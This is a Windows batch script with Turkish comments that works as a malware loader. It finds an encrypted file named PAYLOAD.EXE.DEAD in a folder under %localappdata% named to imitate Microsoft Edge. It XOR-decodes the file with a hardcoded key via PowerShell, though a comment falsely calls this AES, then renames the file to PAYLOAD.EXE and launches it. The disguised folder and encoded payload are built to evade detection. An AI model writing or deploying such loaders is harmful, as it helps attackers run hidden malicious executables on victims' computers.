@echo off
setlocal EnableDelayedExpansion

:: Başlangıç
set "filePath=%localappdata%\MICROSOFT--EDGE\PAYLOAD.EXE.DEAD"

:: Dosya var mı kontrolü
if not exist "%filePath%" (
    echo File does not exist: %filePath%
    exit /b
)

:: Uzantı kontrolü
if /i not "%filePath:~-5%"==".dead" (
    echo The file does not have a .dead extension: %filePath%
    exit /b
)

:: Dosya çözme işlemi
echo Decrypting file %filePath%...
call :EncryptDecryptFile "%filePath%"
echo Decrypted: %filePath%

:: Yeni dosya yolu oluşturma
set "newFilePath=%filePath:.dead=%"
echo Original file path: %filePath%
echo New file path: %newFilePath%

:: Dosya adını değiştirme
for %%F in ("%filePath%") do (
    set "dir=%%~dpF"
    set "filename=%%~nF"
    set "extension=%%~xF"
)

ren "%filePath%" "%filename%%extension:~0,-5%"
timeout /t 2

echo File decrypted and renamed to: %newFilePath%

color 07
start "" "%localappdata%\MICROSOFT--EDGE\PAYLOAD.EXE"
exit /b

:EncryptDecryptFile
set "inputFile=%~1"

:: AES şifreleme çözme işlemi (PowerShell ile)
powershell -NoProfile -Command ^
    "$key = '12345678901234567890123456789012';" ^  :: 32-byte (256-bit) anahtar kullanıyoruz
    "$content = [System.IO.File]::ReadAllBytes(\"%inputFile%\");" ^
    "$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key);" ^
    "for ($i = 0; $i -lt $content.Length; $i++) {" ^
    "    $content[$i] = $content[$i] -bxor $keyBytes[$i %% $keyBytes.Length];" ^
    "}" ^
    "[System.IO.File]::WriteAllBytes(\"%inputFile%\", $content);"

Exit /b
